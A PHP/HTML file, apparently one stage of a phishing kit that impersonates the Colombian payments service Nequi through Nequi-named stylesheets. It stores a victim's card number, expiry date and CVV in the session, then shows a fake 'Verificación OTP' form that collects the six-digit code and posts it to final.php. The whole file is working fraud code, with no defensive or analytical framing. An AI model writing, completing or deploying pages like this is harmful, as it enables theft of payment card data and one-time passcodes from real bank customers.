<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $_SESSION["numero_tarjeta"]     = $_POST["numero_tarjeta"] ?? '';
    $_SESSION["fecha_vencimiento"]  = $_POST["fecha_vencimiento"] ?? '';
    $_SESSION["cvv"]                = $_POST["cvv"] ?? '';
} else {
    header("Location: ../login.html");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Validación OTP</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- ✅ Rutas CSS corregidas -->
    <link rel="stylesheet" type="text/css" href="../assets/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/main.css">
</head>
<body>
    <div class="container">
        <h2>Verificación OTP</h2>
        <p class="ng-binding">Ingresa el código que enviamos a tu celular registrado.</p>

        <!-- 🔹 Aquí puedes decidir la siguiente ruta -->
        <form method="POST" action="final.php" autocomplete="off">
            <div class="form-group">
                <input type="text" name="otp" placeholder="Código OTP" maxlength="6" minlength="6" required>
            </div>

            <div class="btn-wrap">
                <input class="form-btn-submit" type="submit" value="Confirmar">
            </div>
        </form>
    </div>

    <!-- ✅ JS corregido -->
    <script src="../assets/js/script.js"></script>
</body>
</html>
